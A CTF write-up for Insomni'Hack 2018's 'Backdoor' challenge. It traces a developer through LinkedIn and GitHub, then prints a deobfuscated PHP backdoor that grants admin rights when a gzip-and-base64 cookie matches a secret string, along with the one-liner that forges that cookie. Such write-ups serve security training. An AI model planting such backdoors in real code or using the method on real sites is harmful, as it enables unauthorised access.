---
title: Insomni'Hack 2018 - Backdoor
layout: writeup
authors: Guillaume_Lopes
ctf_url: https://insomnihack.ch/
---
Solves: 25 / Points: 124


## Challenge description
Hello shady hacker, I represent a web development company trying to grow in Geneva, but unfortunately we're running into a lot of competition. One company in particular is stealing all our clients and we'd like you to hack them to obliterate their reputation and show that they are terrible developers. Here is one of their websites. Can you break in and prove that they suck?



## Challenge resolution


When connecting to the webapp http://bd.insomniack.ch, we can found in the HTML code the name of the developer:

* James Karsmith

After some Googling, we finally found a Linkedin account from a web developer working in Geneve with the same name:
![James Linkedin Profile](/assets/james.png)

When looking on a GitHub, we can find only one user with the company name:

* https://github.com/WackyWebWizards

In the repository, we can see the developer created a backdoor in order to login as shown in the code below:
![backdoor code](/assets/backdoor-code.png)

In order to retrieve the value of $code variable, we just modified `eval` function with `echo` and we obtained the following code:
```php
if(gzinflate(base64_decode($_COOKIE['wwwadmin'])) === "s3cr3t_backd00r_to_all_pages!") {
	$_SESSION['id'] = 1;
	$_SESSION['admin'] = 1;
}
```

So to sump up, in order to obtain admin access, we need to have a cookie name `wwwadmin` with the value "s3cr3t_backd00r_to_all_pages!" compressed with Gzip and encoded in base64.
It's just one line of PHP:
```php
echo base64_encode(gzdeflate("s3cr3t_backd00r_to_all_pages!"));
```

At the end we obtain the flag!!!

![Flag](/assets/backdoor-flag.png)
